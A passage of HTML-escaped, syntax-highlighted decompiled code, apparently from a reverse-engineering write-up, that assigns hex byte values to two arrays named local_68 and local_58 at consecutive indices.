&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xac&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd9
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xac&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaa
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xad&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa2
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xad&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xfd
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xae&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xea
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xae&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8b
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaf&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaf&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xfd
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8d
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd0
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb1
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf9
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x90
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb6
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd8
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf7
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x91
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1b
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xad
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc1
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb7&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaf
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb7&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf0
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb8&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5d
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb8&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x35
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd8
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbd
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xba&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xca
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xba&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb2
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbb&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x29
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbb&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbc&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbc&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbc
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbd&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb5
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbd&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x87
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbe&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbe&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6e
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbf&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbd
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbf&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8c
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xce
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf8
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf8
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9a
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9d
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xae
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcb
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaa
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x18
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2f
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa0
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc5
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xea
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;199&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xce
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;199&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa8
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x30
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x77
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xca&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xca&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3a
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcb&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcb&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbb
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcc&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xeb
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcc&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd9
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcd&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcd&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3c
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xce&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x73
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xce&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x40
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcf&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xda
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcf&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe2
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaf
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x61
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x53
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x51
